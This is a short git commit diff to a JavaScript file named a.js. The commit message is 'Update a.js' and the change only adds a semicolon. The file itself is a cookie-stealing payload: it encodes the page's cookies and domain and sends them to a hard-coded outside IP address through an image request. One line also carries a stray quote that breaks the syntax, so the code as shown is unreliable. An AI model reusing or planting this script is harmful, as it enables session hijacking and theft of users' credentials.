9e4a36ba4c82c493c41c3599a20e9efbc7455dd2
ZiYuan Han <onbpazy@163.com>
2016-07-21 09:45:44 +0800

    Update a.js

--- a.js
+++ a.js
@@ -1,5 +1,5 @@
 var c = encodeURI(document.cookie);
 var d = encodeURI(document.domain);
-var img = document.createElement("img")
+var img = document.createElement("img");
 var s = '//198.199.123.13/u.php?c='+c+"&d="+d';
 img.setAttribute("src", s);
